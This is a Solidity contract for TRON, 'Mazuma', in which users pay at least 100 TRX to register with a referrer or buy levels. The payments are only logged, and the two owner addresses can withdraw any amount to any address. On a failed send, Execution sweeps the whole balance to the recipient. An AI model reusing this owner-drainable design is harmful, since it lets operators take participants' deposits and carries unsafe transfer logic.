//SourceUnit: Mazuma.sol

pragma solidity >=0.4.23 <0.6.0;
 

interface TRC20 {
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}

contract Mazuma{

    address public owner;
    address public owner1;
    
    event Registration(address indexed user, address indexed referrer,uint256 amount,uint pack);
    event Upgrade(address indexed user, uint8 level,uint256 amount,uint pack);
    event WithToken(address indexed user,uint256 payment,uint256  withid); 

    constructor(address ownerAddress,address ownerAddress1) public {
        owner = ownerAddress;
        owner1= ownerAddress1;   
    }

    
    function() external payable {
        
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }

    function registration(address userAddress, address referrerAddress) private {
        require(msg.value>=100 trx, "invalid price");
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        emit Registration(userAddress, referrerAddress,msg.value,1);
    }
    
    function buyNewLevel(uint8 level) external payable {
        require(msg.value>=100 trx, "invalid price");
        emit Upgrade(msg.sender,level,msg.value,2);
    }    
   
    function Withdrawal(address userAddress,uint256 amnt) external payable {   
        if(owner1==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }
      
    function Withdrawalown(address userAddress,uint256 amnt) external payable {   
        if(owner==msg.sender)
        {
           Execution(userAddress,amnt);        
        }            
    }

    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }
   
    function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId,address _tokenAddress) public payable {
         if(owner==msg.sender)
         {
          for (uint8 i = 0; i < _address.length; i++) {      
              emit WithToken(_address[i],_amount[i],_withId[i]);
              TRC20(_tokenAddress).transfer(_address[i], _amount[i]);
            }
        }
    } 

    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}